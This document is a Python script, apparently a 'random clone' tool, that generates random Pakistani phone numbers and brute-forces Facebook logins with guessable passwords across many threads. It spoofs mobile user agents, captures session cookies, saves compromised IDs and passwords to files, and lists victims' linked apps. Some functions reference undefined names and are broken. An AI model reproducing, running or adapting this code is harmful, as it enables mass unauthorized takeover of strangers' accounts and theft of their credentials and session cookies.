#- SCRIPT UTA LE 
#- AUR FOLLOW KARNA NA BHOOLNA

from bs4 import BeautifulSoup as sop
from concurrent.futures import ThreadPoolExecutor as tred
import os,sys,time,json,random,re,string,platform,base64,platform,uuid
import marshal
try:
    import requests
    from concurrent.futures import ThreadPoolExecutor as ThreadPool
    import mechanize
    from requests.exceptions import ConnectionError
except ModuleNotFoundError:
    os.system('pip install mechanize requests futures==2 > /dev/null')
    os.system('python ALONE.py')
from bs4 import BeautifulSoup
ugen = []
A = '\x1b[1;97m' 
B = '\x1b[1;96m' 
C = '\x1b[1;91m' 
D = '\x1b[1;92m'
M = '\033[1;31m'
H = '\033[1;32m'
N = '\x1b[1;37m'    
E = '\x1b[1;93m' 
F = '\x1b[1;94m'
G = '\x1b[1;95m'
P = '\033[1;37m'
RED = '\033[1;91m'
WHITE = '\033[1;97m'
GREEN = '\033[1;32m' #
YELLOW = '\033[1;33m'
BLUE = '\033[1;34m'
ORANGE = '\033[1;35m'
LUQMAN = '{ LUQMAN }'
for xd in range(10000):
    a='Mozilla/5.0 (Linux; U; Android'
    b=random.choice(['6','7','8','9','10','11','12'])
    c=' en-us; GT-'
    d=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
    e=random.randrange(1, 999)
    f=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
    g='AppleWebKit/537.36 (KHTML, like Gecko) Chrome/'
    h=random.randrange(73,100)
    i='0'
    j=random.randrange(4200,4900)
    k=random.randrange(40,150)
    l='Mobile Safari/537.36'
    uaku2=f'{a} {b}; {c}{d}{e}{f}) {g}{h}.{i}.{j}.{k} {l}'
    ugen.append(uaku2)
try:
    os.system('curl https://bacho1001.blogspot.com/2022/07/ua.html -o ua.html')
except:
    pass
sock=open('ua.html','r').read().splitlines()
def uaku():
    try:
        ua=open('bbnew.txt','r').read().splitlines()
        for ub in ua:
            ugen.append(ub)
    except:
        a=requests.get('https://bacho1001.blogspot.com/2022/07/ua.html').text
        ua=open('.user-agents.txt','w')
        aa=re.findall('line">(.*?)<',str(a))
        for un in aa:
            ua.write(un+'\n')
        ua=open('.user-agents.txt','r').read().splitlines()
loop = 0
cps = []
oks = []
twf = []
os.system('xdg-open https://www.facebook.com/groups/865552464137289/?ref=share')
os.system('xdg-open https://www.facebook.com/groups/865552464137289/?ref=share')

def clear():
    os.system('clear')
    print(logo)

logo = """
\t\x1b[1;97m   ###    ##        #######  ##    ## ########    
\t\x1b[1;92m  ## ##   ##       ##     ## ###   ## ##       
\t\x1b[1;97m ##   ##  ##       ##     ## ####  ## ##       
\t\x1b[1;92m##     ## ##       ##     ## ## ## ## ######   
\t\x1b[1;97m######### ##       ##     ## ##  #### ## 
\t\x1b[1;92m##     ## ##       ##     ## ##   ### ## 
\t\x1b[1;97m##     ## ########  #######  ##    ## ########



  AUTHOR   :   SILENT HACKER
  FACEBOOK :   MR DEVIL
  GITHUB    :   SILENT 786
  LIFE STATUS  :   ALONE 
  FB GROUP  : SILENT HACKER 0001
  TOOL STATUS :  FREE                             
\033[1;91m=========================================================="""






def linex():
    print(f'{GREEN}==========================================================')
def checks(oks,cps,twf):
    if not len(oks) != 0:
        pass
    if len(cps) != 0:
        print('\n\n\x1b[1;97m TOTAL OK : \x1b[1;97m %s  \x1b[1;97mALONE-OK.txt' % (
            H, P, str(len(oks))))
        print('\x1b[1;97m TOTAL CP :\x1b[1;97m   %s \x1b[1;97mALONE-CP.txt' %
              (H, P, str(len(cps))))
        print('\x1b[1;97m TOTAL 2F :\x1b[1;97m   %s \x1b[1;97mALONE-2F.txt' %
              (H, P, str(len(twf))))
        input("\x1b[1;97mPRESE ENTER TO BACK xyz  ")
        xyz()
loop = 0
cps = []
oks = []
twf = []
def cek_apk(session,coki):
    w=session.get("https://mbasic.facebook.com/settings/apps/tabbed/?tab=active",cookies={"cookie":coki}).text
    sop = BeautifulSoup(w,"html.parser")
    x = sop.find("form",method="post")
    game = [i.text for i in x.find_all("h3")]
    if len(game)==0:
        print(f'\r %s[%s!%s] %s{ORANGE}SORRY THERE IS NO ACTIVE  APKS 🎮%s  '%(ORANGE))
    else:
        print(f'\r {GREEN}[√] %sYOUR ACTIVE APPLICATION DETAILS :'%(GREEN))
        for i in range(len(game)):
            print(f"\r%s[%s] %s %s "%(N,i+1,game[i]. replace("Ditambahkan pada"," Ditambahkan pada"),N))
        #else:
            #print(f'\r %s[%s!%s] Sorry, Apk check failed invalid cookie'%(N,M,N))
    w=session.get("https://mbasic.facebook.com/settings/apps/tabbed/?tab=inactive",cookies={"cookie":coki}).text
    sop = BeautifulSoup(w,"html.parser")
    x = sop.find("form",method="post")
    game = [i.text for i in x.find_all("h3")]
    if len(game)==0:
        print(f'\r %s[%s!%s] %s{ORANGE}SORRY THERE IS NO EXPIRED APKS 🎮%s'%(ORANGE))
    else:
        print(f'\r 🎮  %{RED}sYOUR EXPIRED APKS DETAILS :'%(RED))
        for i in range(len(game)):
            print(f"\r%s[%s] %s %s "%(N,i+1,game[i]. replace("Kedaluwarsa"," Kedaluwarsa"),N))
            print(f"{GREEN}[√]---------------------------------------------------[√]")
    #____________#
def xyz():
    os.system("play-audio WELCOME_TO_HAMI_BOOT_818.mp3")
    os.getuid
    os.system("clear");print(logo)
    print('           \x1b[97m[\033[37;41m  M A I N   M E N U   \033[0;m] ')
    print(f"")
    print(f"{BLUE}[01] {GREEN}RANDOM CLONE PAK  M1")
    print(f"{BLUE}[00] {GREEN}EXIT PROGRAM ")
    print(f"")
    print(f"\033[1;91m========================================================")
    LUQMAN = input("[√] CHOOSE : ")
    if LUQMAN in ["1","01"]:
        Tabii()
    elif LUQMAN in ["0","00"]:
       exit()
    else:
        print('\033[1;31mINCORECT OPTION!\033[1;31m')
        xyz()


def passwrd():
	print(f'>>>>> <<<<< ')
	print('')
	print(f'\x1b[1;93m[\x1b[1;92m+\x1b[1;93m]\x1b[1;93m >{x}HAMA {h}OK{x} SAVE IN : {h}OK/%s {x}'%(okc))
	print(f'\x1b[1;93m[\x1b[1;92m+\x1b[1;93m]\x1b[1;93m >{x}HAMA {k}CP{x} SAVE IN : {k}CP/%s {x}'%(cpc))
	os.system('clear');banner()
	print(f'\x1b[1;93m[\x1b[1;92m+\x1b[1;93m]\x1b[1;93m >\x1b[1;92mCRACK HAS BEEN STARTS PLS TURN ON AIRPLANE MODE FOR EVERY 1K IDS {K}1k{x} {h}Idz\n')
	with tred(max_workers=30) as pool:
		for yuzong in id2:
			idf,nmf = yuzong.split('|')[0],yuzong.split('|')[1].lower()
			frs = nmf.split(' ')[0]
			pwv =[]
			if len(nmf)<6:
				if len(frs)<3:
					pass
				else:
					pwv.append(frs+frs)
					pwv.append(frs+"123")
					pwv.append(frs+" "+frs)
					pwv.append("1122334455")
					pwv.append("12345678")
					pwv.append("123456")
					pwv.append(frs+"12")
					pwv.append(frs+"1988")
					pwv.append(frs+"1989")
					pwv.append(frs+"1990")
					pwv.append(frs+"1991")
					pwv.append(frs+"1992")
					pwv.append(frs+"1993")
					pwv.append(frs+"1994")
					pwv.append(frs+"1995")
					pwv.append(frs+"112233")
					pwv.append(frs+"1234")
					pwv.append(frs+"12345")
					pwv.append(frs+"123456")
					pwv.append("112233")
					pwv.append("11223344")
					pwv.append("1122")
					pwv.append("1234567")
					pwv.append("12345678")
					pwv.append("1985")
					pwv.append(frs+"123456789")
					pwv.append(frs+"1234567890")
					pwv.append(frs+"1986")
					pwv.append("123"+frs)
					pwv.append("1234"+frs)
			else:
				if len(frs)<3:
					pwv.append(nmf)
				else:
					pwv.append(nmf)
					pwv.append(frs+'123')
					pwv.append(frs+frs)
					pwv.append(frs+'1234')
					pwv.append(frs+'12345')
					pwv.append(frs+'123456')
					pwv.append(frs+'123456789')
					pwv.append(frs+'1234567890')
					pwv.append(frs+'1122')
					pwv.append(frs+'1212')
					pwv.append('123'+frs+'123')
					pwv.append('1234'+frs+'1234')
					pwv.append('12345'+frs+'12345')
					pwv.append('123'+frs)
					pwv.append('1234'+frs)
					pwv.append('12345'+frs)
					pwv.append(frs+" "+frs)
					pwv.append("1122334455")
					pwv.append(frs+"12")
					pwv.append(frs+"1987")
					pwv.append(frs+"1988")
					pwv.append(frs+"1989")
					pwv.append(frs+"1990")
					pwv.append(frs+"1991")
					pwv.append(frs+"1992")
					pwv.append(frs+"1993")
					pwv.append(frs+"1994")
					pwv.append(frs+"1995")
					pwv.append(frs+"2005")
					pwv.append(frs+"2000")
			if 'ya' in pwpluss:
				for xpwd in pwnya:
					pwv.append(xpwd)
			else:pass
			if 'mobile' in method:
				pool.submit(crack,idf,pwv)
			elif 'free' in method:
				pool.submit(crackfree,idf,pwv)
			elif 'touch' in method:
				pool.submit(cracktouch,idf,pwv)
			elif 'mbasic' in method:
				pool.submit(crackmbasic,idf,pwv)
			else:
				pool.submit(crackmbasic,idf,pwv)
	print('')
	cetak(nel('\t[cyan]-[green] CRACK DONE.....[cyan] =[white] '))
	print(f'[{h}�{h}]{h} OK : {h}%s '%(ok))
	print(f'{m}[{m}�{m}]{m} CP : {m}%s{m} '%(cp))
	print('')
	print(' CRACK AGAIN ? [ Y == T ] = ')
	woi = input('\x1b[1;95m   CHOICE = ')
	if woi in ['y','Y']:
		back()
	else:
		print(f'\t{x}{k}  ')
		time.sleep(2)
		exit()
#_____________#
 
#_____________________#

def Tabii():
    user=[]
    os.getuid
    os.geteuid
    os.system("clear")
    print(logo)
    print(f"")
    clear()
    print(f"          \x1b[97m[\033[37;41m  C O D E    M E N U   \033[0;m]")
    print(f"")
    linex()
    print(f"        \x1b[97m[\033[95;42mEXAMPLE :👇\033[0;m]")
    print(f"")
    print(' 0306 ,0300 ,0315 ,0333')
    print(f" 0341 ,0342 ,0345 ,0349")
    print(f" 0321 ,0316 ,0308 ,0309")
    print(f"")
    linex()
    code = input(' PUT CODE : ')
    os.system("clear")
    print(logo)
    print(f"")
    print(f"          \x1b[97m[\033[37;41m  L I M I T   M E N U   \033[0;m]")
    print(f"")
    limit = int(input(' EXAMPLE: 1000, 2000, 5000, 10000\n\n PUT CLONING LIMIT: '))
    for nmbr in range(limit):
        nmp = ''.join(random.choice(string.digits) for _ in range(7))
        user.append(nmp)
    with ThreadPool(max_workers=30) as yaari:    
        clear()
        tl = str(len(user))
        print(f" {BLUE}TOTAL IDZ             : {GREEN}"+tl)
        print(f" {BLUE}COUNTRY YOU CHOOSE    : {GREEN}PAKISTAN ")
        print(f" {BLUE}NUMBER YOU PUT        : {GREEN}"+code)
        print(f" {BLUE}PROCESS HAS BEEN STARTED")
        print(f'{GREEN}===========================================================')
        for love in user:
            uid = code+love
            pwx = [love]
            yaari.submit(free,uid,pwx,tl)
def free(uid,pwx,tl):
    global loop
    global oks
    global agents
    try:
        for ps in pwx:
            bi = random.choice([A])
            session = requests.Session()
            pro = random.choice(ugen)
            free_fb = session.get('https://m.facebook.com').text
            log_data = {
                "lsd":re.search('name="lsd" value="(.*?)"', str(free_fb)).group(1),
            "jazoest":re.search('name="jazoest" value="(.*?)"', str(free_fb)).group(1),
            "m_ts":re.search('name="m_ts" value="(.*?)"', str(free_fb)).group(1),
            "li":re.search('name="li" value="(.*?)"', str(free_fb)).group(1),
            "try_number":"0",
            "unrecognized_tries":"0",
            "email":uid,
            "pass":ps,
            "login":"Log In"}
            header_freefb = {'authority':'m.facebook.com',
            'method': 'POST',
            'scheme': 'https',
            'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9',
            'accept-encoding':'utf-8','accept-language': 'en-US,en;q=0.9',
            'cache-control': 'max-age=0',
            'sec-ch-ua': '" Not A;Brand";v="99", "Chromium";v="101"',
            'sec-ch-ua-mobile': '?1','sec-ch-ua-platform': '"Android"',
            'sec-fetch-dest': 'document',
            'sec-fetch-mode': 'navigate',
            'sec-fetch-site': 'none',
            'sec-fetch-user': '?1',
            'upgrade-insecure-requests': '1',
            'user-agent':pro}
            lo = session.post('https://m.facebook.com/login/device-based/regular/login/?refsrc=deprecated&amp;lwv=100&amp;refid=8',data=log_data,headers=header_freefb).text
            log_cookies=session.cookies.get_dict().keys()
            if 'c_user' in log_cookies:
                coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
                cid = coki[7:22]
                print('\r\033[1;32m[√]---------------------[ALONE-OK]--------------------[√]\nNUMBER : '+uid+'\nUID   : '+cid+' √ '+ps+ '\nCOOKIE   : '+coki+'\n[√]---------------------------------------------------[√]')
                cek_apk(session,coki)
                open('/sdcard/ALONE-OK.txt', 'a').write(cid+' | '+ps+'\n')
                oks.append(cid)
                break
            elif 'checkpoint' in log_cookies:
                coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
                cid=coki[24:39]
                Red = '\033[1;31m'
                print(f'\r{Red}[×]--------------------[ALONE-CP]---------------------[×]\nNUMBER : '+uid+'\nUID   : '+cid+' √ '+ps+ '\n[×]---------------------------------------------------[×]\033[1;97m')
                open('/sdcard/ALONE-CP.txt', 'a').write(cid+' | '+ps+'\n')
                cps.append(cid)
                break
            elif '/x/checkpoint' in log_cookies:
                coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
                cid=coki[7:22]
                Red = '\033[1;31m'
                print(f'\r{YELLOW}[TEMP-LOCK] '+cid+' | '+ps+'\033[1;97m')
                open('/sdcard/ALONE-2F.txt', 'a').write(cid+' | '+ps+'\n')
                twf.append(cid)
            else:
                continue
        loop+=1
        sys.stdout.write(f'\r\33[1;37m[ALONE ] [%s]\33[1;97m [OK:%s~CP:%s]'%(loop,len(oks),len(cps))), 
        sys.stdout.flush()
        checks(oks,cps,twf)
    except:
        pass

        
 
if __name__ == '__main__':
    xyz()